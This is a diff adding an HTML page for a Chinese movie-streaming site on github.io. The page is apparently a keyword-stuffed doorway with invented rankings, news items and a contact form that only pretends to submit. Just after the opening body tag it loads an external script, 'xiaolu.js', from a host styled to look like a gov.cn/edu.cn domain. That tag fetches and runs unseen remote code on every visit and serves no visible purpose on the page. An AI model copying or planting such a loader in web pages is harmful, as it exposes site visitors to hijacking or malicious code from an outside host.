@@ -1,0 +1,382 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+<title>神马我不卡电影网 - 极速流畅 · 高清不卡顿 · 影片排行榜</title>
+<meta name="keywords" content="神马我不卡电影网,shenmawobukadianyingwang-wap,极速观影,高清不卡顿,在线电影,热门排行榜,流畅播放">
+<meta name="description" content="神马我不卡电影网（shenmawobukadianyingwang-wap）专注极速流畅的高清观影体验，告别卡顿，每日精选院线新片与经典佳作，附热门排行榜与深度影评。">
+<meta name="renderer" content="webkit">
+<meta name="format-detection" content="telephone=no">
+<meta property="og:type" content="website">
+<meta property="og:title" content="神马我不卡电影网 - 极速流畅 · 高清不卡顿">
+<meta property="og:description" content="告别卡顿，每日精选院线新片与经典佳作，附热门排行榜与深度影评。">
+<meta property="og:url" content="https://shenmawobukadianyingwang-wap.github.io">
+<link rel="canonical" href="https://shenmawobukadianyingwang-wap.github.io">
+<style>
+:root{
+  --bg:#06070d;--paper:#0d1018;--card:#141824;--card2:#1c2333;
+  --line:#2b3346;--line2:#47536e;
+  --txt:#e9edf6;--txt2:#a6b0c4;--txt3:#6b7590;
+  --lime:#b6ff3c;--lime2:#a0e632;--purple:#a855f7;--pink:#ec4899;--cyan:#22d3ee;
+  --ease:cubic-bezier(.22,.85,.3,1);
+}
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","WenQuanYi Micro Hei","PingFang SC","Microsoft YaHei",sans-serif;
+  background:var(--bg);color:var(--txt);line-height:1.85;font-size:15px;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-2;pointer-events:none;
+  background:radial-gradient(circle at 88% 6%,rgba(168,85,247,.30),transparent 42%),radial-gradient(circle at 4% 96%,rgba(182,255,60,.16),transparent 40%),var(--bg)}
+body::after{content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;opacity:.35;
+  background-image:linear-gradient(var(--line) 1px,transparent 1px),linear-gradient(90deg,var(--line) 1px,transparent 1px);background-size:46px 46px;mask-image:radial-gradient(ellipse at 50% 38%,#000 22%,transparent 76%)}
+a{color:inherit;text-decoration:none;transition:color .25s var(--ease)}
+ul{list-style:none}
+::selection{background:var(--lime);color:#000}
+:focus-visible{outline:2.5px solid var(--lime);outline-offset:3px}
+
+.wrap{max-width:1160px;margin:0 auto;padding:0 22px}
+section{padding:88px 0;position:relative}
+.sec-hd{display:flex;align-items:flex-end;justify-content:space-between;gap:16px;margin-bottom:36px;flex-wrap:wrap}
+.sec-t{font-size:27px;font-weight:900;display:flex;align-items:center;gap:14px;letter-spacing:-.2px}
+.sec-t em{font-style:normal;font-size:11.5px;color:var(--txt3);letter-spacing:3px;text-transform:uppercase}
+.tag-lime{width:34px;height:34px;border-radius:8px;background:var(--lime);box-shadow:0 0 0 6px rgba(182,255,60,.16);flex-shrink:0;position:relative}
+.tag-lime::after{content:"";position:absolute;inset:9px;border-right:4px solid #000;border-top:4px solid #000;transform:rotate(45deg)}
+.sec-more{font-size:13px;color:var(--txt2);border:1.5px solid var(--line2);padding:7px 15px;border-radius:999px;font-weight:700;background:var(--card2)}
+.sec-more:hover{color:#000;background:var(--lime);border-color:var(--lime)}
+
+/* 导航 */
+.header{position:sticky;top:0;z-index:100;background:rgba(6,7,13,.9);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);border-bottom:1px solid var(--line)}
+.nav{max-width:1160px;margin:0 auto;padding:0 22px;height:72px;display:flex;align-items:center;justify-content:space-between;gap:18px}
+.logo{display:flex;align-items:center;gap:11px;font-weight:900;font-size:20px;flex-shrink:0;letter-spacing:-.3px;white-space:nowrap}
+.logo b{width:40px;height:40px;border-radius:9px;background:linear-gradient(140deg,var(--lime),var(--purple));display:grid;place-items:center;font-size:11px;color:#000;font-weight:900}
+.logo .hl{color:var(--lime)}
+.menu{display:flex;gap:4px;align-items:center}
+.menu a{font-size:14.5px;color:var(--txt2);padding:9px 15px;border-radius:999px;font-weight:700}
+.menu a:hover{color:var(--txt);background:var(--card2)}
+.menu a.on{color:#000;background:var(--lime)}
+.btn-nav{display:none;width:42px;height:42px;border:none;border-radius:11px;background:var(--card2);color:var(--txt);font-size:20px;cursor:pointer;border:1px solid var(--line2)}
+
+/* Hero · 速度仪表 */
+.hero{padding:44px 0 24px}
+.hero-in{position:relative;background:var(--paper);border-radius:26px;overflow:hidden;border:1.5px solid var(--line);box-shadow:0 30px 70px rgba(0,0,0,.6);padding:52px 44px}
+.speed{position:absolute;right:44px;top:50%;transform:translateY(-50%);width:270px;height:270px}
+.spin{position:absolute;inset:0;border-radius:50%;border:3px solid transparent;border-top-color:var(--lime);border-right-color:var(--purple);animation:sp 2.6s linear infinite}
+.spin2{position:absolute;inset:18px;border-radius:50%;border:3px dashed var(--line2);animation:sp 14s linear infinite reverse}
+@keyframes sp{to{transform:rotate(360deg)}}
+.hub{position:absolute;inset:0;display:grid;place-items:center}
+.hub span{font-family:Georgia,serif;font-size:46px;font-weight:900;background:linear-gradient(140deg,var(--lime),var(--cyan));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hub small{position:absolute;bottom:60px;font-size:12px;color:var(--txt3);letter-spacing:3px}
+.hero-tx .chip{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;font-weight:800;padding:7px 14px;border-radius:999px;background:var(--card2);border:1px solid var(--line2);color:var(--lime)}
+.hero-tx .chip i{width:8px;height:8px;border-radius:50%;background:var(--lime);box-shadow:0 0 10px var(--lime);animation:pl 1.4s infinite}
+@keyframes pl{50%{opacity:.25}}
+.hero-tx h1{font-size:46px;line-height:1.3;font-weight:900;letter-spacing:-1px;margin-top:16px}
+.hero-tx h1 .hl{color:var(--lime)}
+.hero-tx p{font-size:16px;color:var(--txt2);margin-top:15px;max-width:500px}
+.hero-cta{display:flex;gap:12px;margin-top:26px;flex-wrap:wrap}
+.btn{font-size:14.5px;font-weight:700;padding:13px 26px;border-radius:11px;cursor:pointer;border:1.5px solid transparent;transition:.3s var(--ease);font-family:inherit}
+.btn-p{background:var(--lime);color:#000;box-shadow:0 14px 28px rgba(182,255,60,.3)}
+.btn-p:hover{transform:translateY(-3px);filter:brightness(1.08)}
+.btn-o{background:var(--card2);color:var(--txt);border-color:var(--line2)}
+.btn-o:hover{background:var(--lime);color:#000;border-color:var(--lime)}
+.h-stat{display:flex;gap:36px;margin-top:34px;flex-wrap:wrap}
+.h-stat div b{display:block;font-size:26px;font-weight:900;color:var(--lime);font-family:Georgia,serif}
+.h-stat div span{font-size:12.5px;color:var(--txt3)}
+
+/* 排行榜 · 阶梯进度条 */
+.rank{display:grid;gap:14px}
+.rk{display:grid;grid-template-columns:56px 120px 1fr 110px;gap:18px;align-items:center;background:var(--card);border:1.5px solid var(--line);border-radius:13px;padding:16px 20px;transition:.4s var(--ease)}
+.rk:hover{border-color:var(--lime);transform:translateX(6px)}
+.rk .no{font-family:Georgia,serif;font-size:30px;font-weight:900;color:var(--line2);line-height:1}
+.rk:nth-child(1) .no{color:var(--lime)}
+.rk .cv{height:88px;border-radius:9px;background:linear-gradient(140deg,var(--purple),#6d28d9);position:relative;overflow:hidden}
+.rk:nth-child(2) .cv{background:linear-gradient(140deg,#1d4ed8,#1e40af)}
+.rk:nth-child(3) .cv{background:linear-gradient(140deg,var(--pink),#be185d)}
+.rk:nth-child(4) .cv{background:linear-gradient(140deg,#0e7490,#155e75)}
+.rk .cv b{position:absolute;inset:0;display:grid;place-items:center;font-size:12px;font-weight:900;color:rgba(255,255,255,.85);letter-spacing:1px}
+.rk .info h4{font-size:17px;font-weight:900}
+.rk .info p{font-size:12.5px;color:var(--txt3)}
+.rk .info .bar{height:5px;border-radius:999px;background:var(--card2);margin-top:9px;overflow:hidden}
+.rk .info .bar i{display:block;height:100%;border-radius:999px;background:linear-gradient(90deg,var(--lime),var(--cyan));transform-origin:left;animation:grow 1.1s var(--ease) both}
+@keyframes grow{from{transform:scaleX(0)}}
+.rk .sc{text-align:right}
+.rk .sc b{font-family:Georgia,serif;font-size:24px;font-weight:900;color:var(--lime);display:block}
+.rk .sc span{font-size:11.5px;color:var(--txt3)}
+
+/* 分类 · 霓虹斜角方块 */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:14px}
+.cat{position:relative;background:var(--card);border:1.5px solid var(--line);border-radius:12px;padding:24px 18px;min-height:140px;transition:.4s var(--ease);clip-path:polygon(0 0,100% 0,100% calc(100% - 18px),calc(100% - 18px) 100%,0 100%);display:flex;flex-direction:column;justify-content:space-between}
+.cat:hover{transform:translateY(-7px);background:var(--card2)}
+.cat::before{content:"";position:absolute;right:0;bottom:0;width:18px;height:18px;background:var(--lime)}
+.cat:hover::before{background:var(--purple)}
+.cat .ic{font-size:28px;margin-bottom:14px}
+.cat h4{font-size:16px;font-weight:900}
+.cat span{font-size:12px;color:var(--txt3)}
+.cat:nth-child(2)::before{background:var(--cyan)}
+.cat:nth-child(3)::before{background:var(--pink)}
+.cat:nth-child(4)::before{background:var(--purple)}
+.cat:nth-child(6)::before{background:var(--cyan)}
+.cat:nth-child(7)::before{background:var(--pink)}
+.cat:nth-child(8)::before{background:var(--purple)}
+
+/* 资讯 · 头条 + 时间轴 */
+.news{display:grid;grid-template-columns:1.25fr 1fr;gap:18px}
+.lead{background:var(--card);border:1.5px solid var(--line);border-radius:15px;overflow:hidden;transition:.4s var(--ease);display:flex;flex-direction:column}
+.lead:hover{border-color:var(--lime)}
+.lead .cv{flex:1;min-height:230px;background:linear-gradient(140deg,#4c1d95,#6d28d9);padding:22px;display:flex;flex-direction:column;justify-content:space-between;position:relative;overflow:hidden}
+.lead .cv::after{content:"SMOOTH";position:absolute;right:-12px;bottom:-6px;font-size:58px;font-weight:900;color:rgba(255,255,255,.08);letter-spacing:2px}
+.lead .cv .tg{font-size:11px;font-weight:900;padding:5px 10px;border-radius:6px;background:var(--lime);color:#000;align-self:flex-start}
+.lead .cv h3{font-size:24px;font-weight:900;line-height:1.45;max-width:86%;position:relative;z-index:1}
+.lead .body{padding:20px}
+.lead .body p{font-size:13.5px;color:var(--txt3)}
+.lead .body .meta{display:flex;justify-content:space-between;font-size:12px;color:var(--txt3);border-top:1px dashed var(--line);padding-top:14px;margin-top:14px}
+.lead .body .meta em{font-style:normal;color:var(--lime);font-weight:900}
+.timeline{display:grid;gap:12px}
+.tl{display:grid;grid-template-columns:74px 1fr;gap:14px;background:var(--card);border:1.5px solid var(--line);border-radius:12px;padding:16px;transition:.4s var(--ease);align-items:center}
+.tl:hover{border-color:var(--lime);transform:translateX(5px)}
+.tl .tm{font-family:Georgia,serif;font-size:22px;font-weight:900;color:var(--lime)}
+.tl .tm small{display:block;font-size:11px;color:var(--txt3);font-weight:800;letter-spacing:1px}
+.tl h5{font-size:15px;font-weight:900}
+.tl p{font-size:12.5px;color:var(--txt3)}
+
+/* 关于 · 控制台 */
+.about{background:var(--paper);border:1.5px solid var(--line);border-radius:24px;overflow:hidden;box-shadow:0 30px 70px rgba(0,0,0,.55)}
+.about-head{padding:20px 30px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:10px;border-bottom:1px solid var(--line);background:linear-gradient(90deg,rgba(182,255,60,.12),transparent)}
+.about-head b{font-size:20px;display:flex;align-items:center;gap:10px}
+.about-head b::before{content:"";width:10px;height:10px;border-radius:50%;background:var(--lime);box-shadow:0 0 10px var(--lime);animation:pl 1.4s infinite}
+.about-head span{font-size:12px;color:var(--txt3);font-family:Georgia,serif}
+.about-body{padding:34px 30px;display:grid;grid-template-columns:1fr 1fr;gap:40px;align-items:start}
+.about-body h3{font-size:24px;font-weight:900;margin-bottom:14px}
+.about-body>p{color:var(--txt2);font-size:14.5px}
+.keys{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:22px}
+.key{border:1.5px solid var(--line);border-radius:12px;padding:18px;background:var(--card);position:relative}
+.key::before{content:"";position:absolute;left:14px;top:16px;width:7px;height:7px;border-radius:50%;background:var(--line2)}
+.key.on::before{background:var(--lime);box-shadow:0 0 8px var(--lime)}
+.key b{font-family:Georgia,serif;font-size:22px;font-weight:900;color:var(--lime);display:block;margin-left:16px}
+.key h5{font-size:14.5px;margin:4px 0 4px;margin-left:16px}
+.key p{font-size:12px;color:var(--txt3);margin-left:16px}
+.contact form{display:grid;gap:12px}
+.contact label{font-size:12.5px;color:var(--txt2);font-weight:700}
+.contact input,.contact textarea{width:100%;background:var(--card);border:1.5px solid var(--line);border-radius:11px;padding:12px 14px;font-family:inherit;color:var(--txt);font-size:14px}
+.contact textarea{resize:vertical;min-height:96px}
+.contact input:focus,.contact textarea:focus{outline:none;border-color:var(--lime);box-shadow:0 0 0 3px rgba(182,255,60,.2)}
+.contact button{border:none;border-radius:11px;padding:14px;background:var(--lime);color:#000;font-weight:900;font-size:15px;cursor:pointer;transition:.3s}
+.contact button:hover{filter:brightness(1.08);transform:translateY(-2px)}
+
+/* 页脚 */
+footer{background:var(--paper);color:var(--txt2);padding:56px 0 26px;margin-top:24px;border-top:1px solid var(--line)}
+.foot{max-width:1160px;margin:0 auto;padding:0 22px;display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px}
+.foot .brand{display:flex;align-items:center;gap:11px;font-weight:900;font-size:19px;color:var(--txt);flex-wrap:wrap}
+.foot .brand b{width:36px;height:36px;border-radius:9px;background:linear-gradient(140deg,var(--lime),var(--purple));display:grid;place-items:center;font-size:10px;color:#000}
+.foot .brand .hl{color:var(--lime)}
+.foot>p{font-size:13.5px;margin-top:14px;color:var(--txt3);line-height:1.85}
+.foot h5{font-size:14px;margin-bottom:16px;letter-spacing:1px;color:var(--txt)}
+.foot ul li{margin-bottom:10px}
+.foot ul a{color:var(--txt3);font-size:13.5px}
+.foot ul a:hover{color:var(--lime)}
+.copy{max-width:1160px;margin:34px auto 0;padding:20px 22px 0;border-top:1px solid var(--line);display:flex;justify-content:space-between;gap:14px;flex-wrap:wrap;font-size:12.5px;color:var(--txt3)}
+.copy a{color:var(--txt2)}
+.copy a:hover{color:var(--lime)}
+
+.gotop{position:fixed;right:20px;bottom:-60px;width:46px;height:46px;border-radius:50%;border:none;background:var(--lime);color:#000;font-size:18px;font-weight:900;cursor:pointer;z-index:99;box-shadow:0 12px 26px rgba(182,255,60,.35);transition:.35s var(--ease)}
+.gotop.show{bottom:24px}
+
+@media(max-width:960px){
+  .hero-tx{max-width:none}
+  .speed{width:210px;height:210px}
+  .rk{grid-template-columns:48px 96px 1fr;gap:14px}
+  .rk .sc{grid-column:3;text-align:left}
+  .news{grid-template-columns:1fr}
+}
+@media(max-width:680px){
+  .wrap{padding:0 16px}
+  section{padding:60px 0}
+  .sec-t{font-size:22px}
+  .nav{height:60px}
+  .menu{position:fixed;top:60px;left:0;right:0;flex-direction:column;padding:14px;background:rgba(6,7,13,.98);border-bottom:1px solid var(--line);gap:4px;transform:translateY(-140%);transition:.35s var(--ease)}
+  .menu.open{transform:translateY(0)}
+  .menu a{width:100%;text-align:center;padding:12px;border-radius:10px}
+  .btn-nav{display:grid;place-items:center}
+  .hero-in{padding:32px 20px}
+  .hero-tx h1{font-size:31px}
+  .hero-tx p{font-size:14.5px}
+  .h-stat{gap:20px}
+  .cats{grid-template-columns:repeat(2,1fr)}
+  .rk{grid-template-columns:40px 1fr;gap:12px}
+  .rk .cv{grid-column:2;height:70px}
+  .rk .info{grid-column:2}
+  .rk .sc{grid-column:2}
+  .keys{grid-template-columns:1fr}
+  .foot{grid-template-columns:1fr 1fr;gap:24px}
+  .copy{flex-direction:column;text-align:center}
+}
+@media(max-width:380px){
+  .hero-tx h1{font-size:27px}
+  .cats{grid-template-columns:1fr}
+  .tl{grid-template-columns:1fr}
+  .tl .tm{font-size:18px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="header">
+  <div class="nav">
+    <a class="logo" href="#home" aria-label="神马我不卡电影网 首页"><b>SM</b>神马我不卡<span class="hl">电影网</span></a>
+    <nav class="menu" id="menu">
+      <a href="#home" class="on">首页</a>
+      <a href="#rank">排行榜</a>
+      <a href="#category">影片分类</a>
+      <a href="#news">资讯影评</a>
+      <a href="#about">关于我们</a>
+    </nav>
+    <button class="btn-nav" id="navBtn" aria-label="菜单">☰</button>
+  </div>
+</header>
+
+<!-- Hero · 速度仪表 -->
+<section class="hero" id="home">
+  <div class="wrap">
+    <div class="hero-in">
+      <div class="speed" aria-hidden="true">
+        <div class="spin"></div><div class="spin2"></div>
+        <div class="hub"><span>60</span><small>FPS</small></div>
+      </div>
+      <div class="hero-tx">
+        <div class="chip"><i></i> 全网测速 · 极速流畅不卡顿</div>
+        <h1>神马我不卡电影网<br>看片就一个字：<span class="hl">稳</span></h1>
+        <p>神马我不卡电影网（shenmawobukadianyingwang-wap）专注极速流畅的高清观影体验，告别卡顿与加载等待，每日精选院线新片与经典佳作。</p>
+        <div class="hero-cta">
+          <a class="btn btn-p" href="#rank">查看排行榜</a>
+          <a class="btn btn-o" href="#category">浏览分类</a>
+        </div>
+        <div class="h-stat">
+          <div><b>60fps</b><span>流畅帧率</span></div>
+          <div><b>4K</b><span>高清画质</span></div>
+          <div><b>0</b><span>缓冲等待</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 排行榜 · 阶梯进度条 -->
+<section id="rank" style="padding-top:24px">
+  <div class="wrap">
+    <div class="sec-hd">
+      <div class="sec-t"><i class="tag-lime"></i>热门排行榜<em>Top Chart</em></div>
+      <a class="sec-more" href="#">完整榜单 ›</a>
+    </div>
+    <div class="rank">
+      <div class="rk"><span class="no">01</span><div class="cv"><b>ACTION</b></div><div class="info"><h4>星际回响</h4><p>科幻 · 4K · 宏大宇宙观</p><div class="bar"><i style="width:96%"></i></div></div><div class="sc"><b>9.5</b><span>热度 96</span></div></div>
+      <div class="rk"><span class="no">02</span><div class="cv"><b>DRAMA</b></div><div class="info"><h4>海岸线的尽头</h4><p>剧情 · 治愈 · 温柔镜头</p><div class="bar"><i style="width:91%"></i></div></div><div class="sc"><b>9.2</b><span>热度 91</span></div></div>
+      <div class="rk"><span class="no">03</span><div class="cv"><b>MYSTERY</b></div><div class="info"><h4>无声证词</h4><p>悬疑 · 烧脑 · 反转不断</p><div class="bar"><i style="width:86%"></i></div></div><div class="sc"><b>8.9</b><span>热度 86</span></div></div>
+      <div class="rk"><span class="no">04</span><div class="cv"><b>CLASSIC</b></div><div class="info"><h4>城市之光</h4><p>经典 · 4K修复 · 历久弥新</p><div class="bar"><i style="width:82%"></i></div></div><div class="sc"><b>9.7</b><span>热度 82</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 分类 · 霓虹斜角方块 -->
+<section id="category">
+  <div class="wrap">
+    <div class="sec-hd">
+      <div class="sec-t"><i class="tag-lime"></i>影片分类<em>Genre</em></div>
+      <a class="sec-more" href="#">全部分类 ›</a>
+    </div>
+    <div class="cats">
+      <a class="cat" href="#"><span class="ic">🎬</span><h4>动作冒险</h4><span>大片云集</span></a>
+      <a class="cat" href="#"><span class="ic">😂</span><h4>喜剧搞笑</h4><span>轻松解压</span></a>
+      <a class="cat" href="#"><span class="ic">💗</span><h4>爱情文艺</h4><span>温暖治愈</span></a>
+      <a class="cat" href="#"><span class="ic">🚀</span><h4>科幻奇幻</h4><span>脑洞大开</span></a>
+      <a class="cat" href="#"><span class="ic">🕵️</span><h4>悬疑惊悚</h4><span>反转不断</span></a>
+      <a class="cat" href="#"><span class="ic">🐉</span><h4>动画动漫</h4><span>全龄向</span></a>
+      <a class="cat" href="#"><span class="ic">🌍</span><h4>纪录片</h4><span>真实震撼</span></a>
+      <a class="cat" href="#"><span class="ic">🎞</span><h4>经典老片</h4><span>历久弥新</span></a>
+    </div>
+  </div>
+</section>
+
+<!-- 资讯 · 头条 + 时间轴 -->
+<section id="news">
+  <div class="wrap">
+    <div class="sec-hd">
+      <div class="sec-t"><i class="tag-lime"></i>资讯影评<em>News</em></div>
+      <a class="sec-more" href="#">全部资讯 ›</a>
+    </div>
+    <div class="news">
+      <article class="lead"><div class="cv"><span class="tg">院线同步</span><h3>《星际回响》上线神马我不卡电影网，4K 60fps 全程无缓冲</h3></div><div class="body"><p>宏大宇宙观搭配震撼配乐，配合本站极速流畅的播放体验，被影迷称为"丝滑到停不下来"的年度视听盛宴。</p><div class="meta"><span>神马我不卡 编辑部</span><em>★ 9.5</em></div></div></article>
+      <div class="timeline">
+        <div class="tl"><div class="tm">18<small>OCT</small></div><div><h5>《海岸线的尽头》为什么值得再看一遍</h5><p>克制温柔的镜头，让观众在留白里读懂人物。</p></div></div>
+        <div class="tl"><div class="tm">16<small>OCT</small></div><div><h5>周末刷片不重样 · 七种类型精选</h5><p>从喜剧到悬疑，一份覆盖全类型的观影清单。</p></div></div>
+        <div class="tl"><div class="tm">14<small>OCT</small></div><div><h5>播放卡顿？四招教你把帧率拉满</h5><p>从网络到画质设置，看完不再转圈圈。</p></div></div>
+        <div class="tl"><div class="tm">12<small>OCT</small></div><div><h5>十月必看悬疑片单盘点</h5><p>反转不断，看完忍不住倒回去二刷。</p></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 · 控制台 -->
+<section id="about">
+  <div class="wrap">
+    <div class="about">
+      <div class="about-head"><b>关于神马我不卡电影网</b><span>shenmawobukadianyingwang-wap</span></div>
+      <div class="about-body">
+        <div>
+          <h3>好片配上好速度，才叫爽</h3>
+          <p>神马我不卡电影网（shenmawobukadianyingwang-wap）专注极速流畅的高清观影体验，告别卡顿与加载等待，每日精选院线新片与经典佳作，让每一次点播都顺滑到底。</p>
+          <div class="keys">
+            <div class="key on"><b>60fps</b><h5>丝滑帧率</h5><p>全程流畅不卡顿</p></div>
+            <div class="key on"><b>4K</b><h5>高清画质</h5><p>细节清晰可见</p></div>
+            <div class="key on"><b>0.5s</b><h5>极速启动</h5><p>点开即播不等待</p></div>
+            <div class="key on"><b>24h</b><h5>实时更新</h5><p>新片第一时间上线</p></div>
+          </div>
+        </div>
+        <div class="contact">
+          <form onsubmit="event.preventDefault();this.querySelector('button').textContent='提交成功 ✓'">
+            <div><label>称呼</label><input type="text" placeholder="如何称呼您" required></div>
+            <div><label>邮箱</label><input type="email" placeholder="您的邮箱地址" required></div>
+            <div><label>留言</label><textarea placeholder="想看的影片或卡顿反馈"></textarea></div>
+            <button type="submit">提交留言</button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <div>
+      <div class="brand"><b>SM</b>神马我不卡<span class="hl">电影网</span></div>
+      <p>神马我不卡电影网（shenmawobukadianyingwang-wap）专注极速流畅的高清观影体验，告别卡顿，每日精选院线新片与经典佳作。</p>
+    </div>
+    <div><h5>网站导航</h5><ul><li><a href="#home">网站首页</a></li><li><a href="#rank">热门排行榜</a></li><li><a href="#category">影片分类</a></li><li><a href="#news">资讯影评</a></li></ul></div>
+    <div><h5>热门题材</h5><ul><li><a href="#">动作冒险</a></li><li><a href="#">喜剧搞笑</a></li><li><a href="#">爱情文艺</a></li><li><a href="#">悬疑惊悚</a></li></ul></div>
+    <div><h5>关于本站</h5><ul><li><a href="#about">关于我们</a></li><li><a href="#">投稿合作</a></li><li><a href="#">免责声明</a></li><li><a href="#">联系方式</a></li></ul></div>
+  </div>
+  <div class="copy">
+    <span>© 2026 神马我不卡电影网（shenmawobukadianyingwang-wap） 保留所有权利。</span>
+    <span>网站地址：<a href="https://shenmawobukadianyingwang-wap.github.io">https://shenmawobukadianyingwang-wap.github.io</a></span>
+  </div>
+</footer>
+
+<button class="gotop" id="gotop" aria-label="回到顶部">↑</button>
+
+<script>
+var navBtn=document.getElementById('navBtn'),menu=document.getElementById('menu');
+navBtn.addEventListener('click',function(){menu.classList.toggle('open')});
+menu.querySelectorAll('a').forEach(function(a){a.addEventListener('click',function(){menu.classList.remove('open')})});
+var links=document.querySelectorAll('.menu a'),secs=document.querySelectorAll('section[id]');
+window.addEventListener('scroll',function(){
+  var pos=window.scrollY+120,idx=0;
+  secs.forEach(function(s,i){if(s.offsetTop<=pos)idx=i});
+  links.forEach(function(l,i){l.classList.toggle('on',i===idx)});
+});
+var gotop=document.getElementById('gotop');
+window.addEventListener('scroll',function(){gotop.classList.toggle('show',window.scrollY>400)});
+gotop.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'})});
+</script>
+</body>
+</html>
